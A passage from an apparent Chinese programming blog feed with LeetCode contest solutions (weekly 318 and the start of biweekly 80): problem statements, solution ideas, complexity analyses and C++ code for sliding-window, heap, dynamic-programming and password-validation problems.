<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-318/problems/maximum-sum-of-distinct-subarrays-with-length-k/">https://leetcode.cn/contest/weekly-contest-318/problems/maximum-sum-of-distinct-subarrays-with-length-k/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>哈希统计
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们用哈希表统计连续的 $k$ 个元素，并同时记录 $k$ 个元素的和，如果哈希表中不同的元素刚好等于 $k$ 个，则表示当前的连续子数组符合题目要求，否则则不符合，同时我们将最左端的元素移除，然后继续遍历下一个元素。。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示数组的长度。</li>
<li>空间复杂度：时间复杂度为 $O(n)$，$n$ 表示数组的长度。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">maximumSubarraySum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> tot = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tot &lt; k) &#123;</span><br><span class="line">                cnt[nums[i]]++;</span><br><span class="line">                sum += nums[i];</span><br><span class="line">                tot++;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> (tot == k) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt.<span class="built_in">size</span>() == k) &#123;</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans, sum);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> prev = nums[i - k + <span class="number">1</span>];</span><br><span class="line">                tot--;</span><br><span class="line">                cnt[prev]--;</span><br><span class="line">                sum -= prev;</span><br><span class="line">                <span class="keyword">if</span> (cnt[prev] == <span class="number">0</span>) &#123;</span><br><span class="line">                    cnt.<span class="built_in">erase</span>(prev);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="6231-雇佣-K-位工人的总代价"><a href="#6231-雇佣-K-位工人的总代价" class="headerlink" title="6231. 雇佣 K 位工人的总代价"></a>6231. 雇佣 K 位工人的总代价</h4><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <strong>0</strong> 开始的整数数组 <code>costs</code> ，其中 <code>costs[i]</code> 是雇佣第 <code>i</code> 位工人的代价。</p>
<p>同时给你两个整数 <code>k</code> 和 <code>candidates</code> 。我们想根据以下规则恰好雇佣 <code>k</code> 位工人：</p>
<ul>
<li><p>总共进行 <code>k</code> 轮雇佣，且每一轮恰好雇佣一位工人。</p>
</li>
<li><p>在每一轮雇佣中，从最前面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">candidates</span><br></pre></td></tr></table></figure>

<p> 和最后面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">candidates</span><br></pre></td></tr></table></figure>

<p> 人中选出代价最小的一位工人，如果有多位代价相同且最小的工人，选择下标更小的一位工人。</p>
<ul>
<li>比方说，<code>costs = [3,2,7,7,1,2]</code> 且 <code>candidates = 2</code> ，第一轮雇佣中，我们选择第 <code>4</code> 位工人，因为他的代价最小 <code>[*3,2*,7,7,***1**,2*]</code> 。</li>
<li>第二轮雇佣，我们选择第 <code>1</code> 位工人，因为他们的代价与第 <code>4</code> 位工人一样都是最小代价，而且下标更小，<code>[*3,**2***,7,*7,2*]</code> 。注意每一轮雇佣后，剩余工人的下标可能会发生变化。</li>
</ul>
</li>
<li><p>如果剩余员工数目不足 <code>candidates</code> 人，那么下一轮雇佣他们中代价最小的一人，如果有多位代价相同且最小的工人，选择下标更小的一位工人。</p>
</li>
<li><p>一位工人只能被选择一次。</p>
</li>
</ul>
<p>返回雇佣恰好 <code>k</code> 位工人的总代价。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：costs = [17,12,10,2,7,2,11,20,8], k = 3, candidates = 4</span><br><span class="line">输出：11</span><br><span class="line">解释：我们总共雇佣 3 位工人。总代价一开始为 0 。</span><br><span class="line">- 第一轮雇佣，我们从 [17,12,10,2,7,2,11,20,8] 中选择。最小代价是 2 ，有两位工人，我们选择下标更小的一位工人，即第 3 位工人。总代价是 0 + 2 = 2 。</span><br><span class="line">- 第二轮雇佣，我们从 [17,12,10,7,2,11,20,8] 中选择。最小代价是 2 ，下标为 4 ，总代价是 2 + 2 = 4 。</span><br><span class="line">- 第三轮雇佣，我们从 [17,12,10,7,11,20,8] 中选择，最小代价是 7 ，下标为 3 ，总代价是 4 + 7 = 11 。注意下标为 3 的工人同时在最前面和最后面 4 位工人中。</span><br><span class="line">总雇佣代价是 11 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：costs = [1,2,4,1], k = 3, candidates = 3</span><br><span class="line">输出：4</span><br><span class="line">解释：我们总共雇佣 3 位工人。总代价一开始为 0 。</span><br><span class="line">- 第一轮雇佣，我们从 [1,2,4,1] 中选择。最小代价为 1 ，有两位工人，我们选择下标更小的一位工人，即第 0 位工人，总代价是 0 + 1 = 1 。注意，下标为 1 和 2 的工人同时在最前面和最后面 3 位工人中。</span><br><span class="line">- 第二轮雇佣，我们从 [2,4,1] 中选择。最小代价为 1 ，下标为 2 ，总代价是 1 + 1 = 2 。</span><br><span class="line">- 第三轮雇佣，少于 3 位工人，我们从剩余工人 [2,4] 中选择。最小代价是 2 ，下标为 0 。总代价为 2 + 2 = 4 。</span><br><span class="line">总雇佣代价是 4 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= costs.length &lt;= 105</code></li>
<li><code>1 &lt;= costs[i] &lt;= 105</code></li>
<li><code>1 &lt;= k, candidates &lt;= costs.length</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-318/problems/total-cost-to-hire-k-workers/">https://leetcode.cn/contest/weekly-contest-318/problems/total-cost-to-hire-k-workers/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>堆
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们分别记录当前已经进入候选队列的左侧的终点索引为 $l$, 右侧进入候选队列的终点为 $r$，初始化时我们将 $[0,\cdots,candidates-1],[n-candidates, \cdots,n-1]$ 中的所有优先队列，并标记进入队列的数是左侧的部分还是右侧的部分。</li>
<li>每次从队列中取出最小的数，如果取出的数是左边的待选序列，则我们再从数组的左侧取一个值进入到队列中，此时令 $l &#x3D; l + 1$；如果取出的数是右边的待选序列，则我们再从数组的右侧取一个值进入到队列中，此时令 $r &#x3D; r - 1$。直到满足 $l &#x3D; r - 1$ 为止，此时数组中的所有元素都已压入到待选序列中。</li>
<li>复杂度分析:</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(k \log n )$，$n$ 为数组的元素，$k$ 为给定的选择次数。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，$n$ 为数组的元素。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">totalCost</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; costs, <span class="type">int</span> k, <span class="type">int</span> candidates)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = costs.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> l = candidates - <span class="number">1</span>, r = n - candidates;</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;, greater&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;&gt; pq;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= l; i++) &#123;</span><br><span class="line">            pq.<span class="built_in">emplace</span>(costs[i], <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="built_in">max</span>(l + <span class="number">1</span>, r); i &lt; n; i++) &#123;</span><br><span class="line">            pq.<span class="built_in">emplace</span>(costs[i], <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> tot = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [val, d] = pq.<span class="built_in">top</span>();</span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">            tot += val;</span><br><span class="line">            <span class="keyword">if</span> (l &lt; r - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (d == <span class="number">0</span>) &#123;</span><br><span class="line">                    pq.<span class="built_in">emplace</span>(costs[++l], <span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    pq.<span class="built_in">emplace</span>(costs[--r], <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6232-最小移动总距离"><a href="#6232-最小移动总距离" class="headerlink" title="6232. 最小移动总距离"></a>6232. 最小移动总距离</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>X 轴上有一些机器人和工厂。给你一个整数数组 <code>robot</code> ，其中 <code>robot[i]</code> 是第 <code>i</code> 个机器人的位置。再给你一个二维整数数组 <code>factory</code> ，其中 <code>factory[j] = [positionj, limitj]</code> ，表示第 <code>j</code> 个工厂的位置在 <code>positionj</code> ，且第 <code>j</code> 个工厂最多可以修理 <code>limitj</code> 个机器人。</p>
<p>每个机器人所在的位置 <strong>互不相同</strong> 。每个工厂所在的位置也 <strong>互不相同</strong> 。注意一个机器人可能一开始跟一个工厂在 <strong>相同的位置</strong> 。</p>
<p>所有机器人一开始都是坏的，他们会沿着设定的方向一直移动。设定的方向要么是 X 轴的正方向，要么是 X 轴的负方向。当一个机器人经过一个没达到上限的工厂时，这个工厂会维修这个机器人，且机器人停止移动。</p>
<p><strong>任何时刻</strong>，你都可以设置 <strong>部分</strong> 机器人的移动方向。你的目标是最小化所有机器人总的移动距离。</p>
<p>请你返回所有机器人移动的最小总距离。测试数据保证所有机器人都可以被维修。</p>
<p><strong>注意：</strong></p>
<ul>
<li>所有机器人移动速度相同。</li>
<li>如果两个机器人移动方向相同，它们永远不会碰撞。</li>
<li>如果两个机器人迎面相遇，它们也不会碰撞，它们彼此之间会擦肩而过。</li>
<li>如果一个机器人经过了一个已经达到上限的工厂，机器人会当作工厂不存在，继续移动。</li>
<li>机器人从位置 <code>x</code> 到位置 <code>y</code> 的移动距离为 <code>|y - x|</code> 。</li>
</ul>
<p><strong>示例 1：</strong></p>
<p><img src="https://pic.leetcode-cn.com/1667542978-utuiPv-image.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：robot = [0,4,6], factory = [[2,2],[6,2]]</span><br><span class="line">输出：4</span><br><span class="line">解释：如上图所示：</span><br><span class="line">- 第一个机器人从位置 0 沿着正方向移动，在第一个工厂处维修。</span><br><span class="line">- 第二个机器人从位置 4 沿着负方向移动，在第一个工厂处维修。</span><br><span class="line">- 第三个机器人在位置 6 被第二个工厂维修，它不需要移动。</span><br><span class="line">第一个工厂的维修上限是 2 ，它维修了 2 个机器人。</span><br><span class="line">第二个工厂的维修上限是 2 ，它维修了 1 个机器人。</span><br><span class="line">总移动距离是 |2 - 0| + |2 - 4| + |6 - 6| = 4 。没有办法得到比 4 更少的总移动距离。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<p><img src="https://pic.leetcode-cn.com/1667542984-OAIRFN-image.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：robot = [1,-1], factory = [[-2,1],[2,1]]</span><br><span class="line">输出：2</span><br><span class="line">解释：如上图所示：</span><br><span class="line">- 第一个机器人从位置 1 沿着正方向移动，在第二个工厂处维修。</span><br><span class="line">- 第二个机器人在位置 -1 沿着负方向移动，在第一个工厂处维修。</span><br><span class="line">第一个工厂的维修上限是 1 ，它维修了 1 个机器人。</span><br><span class="line">第二个工厂的维修上限是 1 ，它维修了 1 个机器人。</span><br><span class="line">总移动距离是 |2 - 1| + |(-2) - (-1)| = 2 。没有办法得到比 2 更少的总移动距离。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= robot.length, factory.length &lt;= 100</code></li>
<li><code>factory[j].length == 2</code></li>
<li><code>-109 &lt;= robot[i], positionj &lt;= 109</code></li>
<li><code>0 &lt;= limitj &lt;= robot.length</code></li>
<li>测试数据保证所有机器人都可以被维修。</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-318/problems/minimum-total-distance-traveled/">https://leetcode.cn/contest/weekly-contest-318/problems/minimum-total-distance-traveled/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>设 $dp[i][j]$ 表示前 $i$ 个工厂维修前 $j$ 个机器人的最小距离之和。则我们可以知道相关的递推公式如下：<br>$$<br>dp[i][j] &#x3D; \min\limits_{k&#x3D;0}^{\min(j, limit[i])} (dp[i-1][j - k] + \sum_{s&#x3D;1}^{k}|robot[j-s]-postion[i]|)<br>$$<br>题目主要的难点在于最后一个工厂可以修理 $[0,\min(limit[i],m)]$ 个机器人。前 $i$ 个工厂的维修总数目为 $j$，如果最后一个工厂 $i$ 的维修数目依次为 $k$，则前 $i-1$ 个工厂的维修数目为 $j-k$，我们依次尝试工厂 $i$ 可能的数目即可得到递推公式。<br>2 . 复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(m^2 \times n)$，其中 $m$ 表示机器人的数目，$n$ 表示工厂的数目。</li>
<li>空间复杂度：$O(m^2 \times n)$，其中 $m$ 表示机器人的数目，$n$ 表示工厂的数目。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">minimumTotalDistance</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; robot, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; factory)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = robot.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = factory.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(robot.<span class="built_in">begin</span>(), robot.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(factory.<span class="built_in">begin</span>(), factory.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = LONG_MAX;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">dp</span>(n, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(m + <span class="number">1</span>, LONG_MAX));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">ndp</span>(n, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(m + <span class="number">1</span>, LONG_MAX));</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="type">int</span> limit = factory[j][<span class="number">1</span>];</span><br><span class="line">                <span class="type">int</span> dist = <span class="built_in">abs</span>(robot[i<span class="number">-1</span>] - factory[j][<span class="number">0</span>]);</span><br><span class="line">                <span class="type">long</span> <span class="type">long</span> minval = LONG_MAX;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; limit; k++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (dp[j][k] != LONG_MAX) &#123;</span><br><span class="line">                        ndp[j][k + <span class="number">1</span>] = <span class="built_in">min</span>(ndp[j][k + <span class="number">1</span>], dp[j][k] + dist);</span><br><span class="line">                        minval = <span class="built_in">min</span>(minval, ndp[j][k + <span class="number">1</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = j + <span class="number">1</span>; k &lt; n; k++) &#123;</span><br><span class="line">                    ndp[k][<span class="number">0</span>] = <span class="built_in">min</span>(ndp[k][<span class="number">0</span>], minval);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            dp = <span class="built_in">move</span>(ndp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= m; k++) &#123;</span><br><span class="line">                ans = <span class="built_in">min</span>(ans, dp[i][k]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">minimumTotalDistance</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; robot, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; factory)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = robot.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = factory.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(robot.<span class="built_in">begin</span>(), robot.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(factory.<span class="built_in">begin</span>(), factory.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = LONG_MAX;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">dp</span><span class="params">(m + <span class="number">1</span>, LONG_MAX)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> postion = factory[i - <span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> limit = factory[i - <span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= <span class="number">1</span>; j--) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="type">long</span> cost = <span class="number">0L</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= <span class="built_in">min</span>(j, limit); k++) &#123;</span><br><span class="line">                    cost += <span class="built_in">abs</span>(robot[j - k] - postion);</span><br><span class="line">                    <span class="keyword">if</span> (dp[j - k] != LONG_MAX) &#123;</span><br><span class="line">                        dp[j] = <span class="built_in">min</span>(dp[j], dp[j - k] + cost);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  contest biweekly 80</title>
    <url>/2022/01/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/8/</url>
    <content><![CDATA[<h2 id="leetcode-contest-biweekly-80"><a href="#leetcode-contest-biweekly-80" class="headerlink" title="leetcode  contest biweekly 80"></a>leetcode  contest biweekly 80</h2><p>官方难道是手速场，第三题想了半天也没想到什么好办法，直接暴力竟然过了，不知道是什么出题逻辑。<br><img src="https://cdn.mathpix.com/snip/images/W6wEZdcvXRlPYY56OcgueL-2y1yN_dFnulvU3ZSjvVU.original.fullsize.png"></p>
<h3 id="6095-强密码检验器-II"><a href="#6095-强密码检验器-II" class="headerlink" title="6095. 强密码检验器 II"></a>6095. 强密码检验器 II</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>如果一个密码满足以下所有条件，我们称它是一个 强 密码：</p>
<ul>
<li>它有至少 <code>8</code> 个字符。</li>
<li>至少包含 一个小写英文 字母。</li>
<li>至少包含 一个大写英文 字母。</li>
<li>至少包含 一个数字 。</li>
<li>至少包含 一个特殊字符 。特殊字符为：<code>&quot;!@#$%^&amp;*()-+&quot;</code> 中的一个。</li>
<li>它 不 包含 <code>2</code> 个连续相同的字符（比方说 <code>&quot;aab&quot;</code> 不符合该条件，但是 <code>&quot;aba&quot;</code> 符合该条件）。<br>给你一个字符串 <code>password</code> ，如果它是一个 强 密码，返回 <code>true</code>，否则返回 <code>false</code> 。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：password = &quot;IloveLe3tcode!&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：密码满足所有的要求，所以我们返回 true 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：password = &quot;Me+You--IsMyDream&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：密码不包含数字，且包含 2 个连续相同的字符。所以我们返回 false 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：password = &quot;1aB!&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：密码不符合长度要求。所以我们返回 false 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= password.length &lt;= 100</code></li>
<li><code>password</code> 包含字母，数字和 <code>&quot;!@#$%^&amp;*()-+&quot;</code> 这些特殊字符。</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-80/problems/strong-password-checker-ii/">https://leetcode.cn/contest/biweekly-contest-80/problems/strong-password-checker-ii/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>按照题目逻辑模拟即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$, 其中 $n$ 为字符串的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">strongPasswordCheckerII</span><span class="params">(string password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (password.<span class="built_in">size</span>() &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">bool</span> hasBig = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">bool</span> hasSmall = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">bool</span> hasDigit = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">bool</span> hasSpecial = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">bool</span> hasSame = <span class="literal">false</span>;</span><br><span class="line">        set&lt;<span class="type">char</span>&gt; cnt;</span><br><span class="line">        string special = <span class="string">&quot;!@#$%^&amp;*()-+&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> c : special) &#123;</span><br><span class="line">            cnt.<span class="built_in">emplace</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; password.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(password[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; password[i] &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">                hasBig = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(password[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; password[i] &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">                hasSmall = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(password[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; password[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                hasDigit = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(cnt.<span class="built_in">count</span>(password[i])) &#123;</span><br><span class="line">                hasSpecial = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; password[i] == password[i<span class="number">-1</span>])&#123;</span><br><span class="line">                hasSame = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (hasBig &amp;&amp; hasSmall &amp;&amp; hasDigit &amp;&amp; hasSpecial &amp;&amp; (!hasSame)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6096-咒语和药水的成功对数"><a href="#6096-咒语和药水的成功对数" class="headerlink" title="6096. 咒语和药水的成功对数"></a>6096. 咒语和药水的成功对数</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你两个正整数数组 <code>spells</code> 和 <code>potions</code> ，长度分别为 <code>n</code> 和 <code>m</code> ，其中 <code>spells[i]</code> 表示第 <code>i</code> 个咒语的能量强度，<code>potions[j]</code> 表示第 <code>j</code> 瓶药水的能量强度。</p>
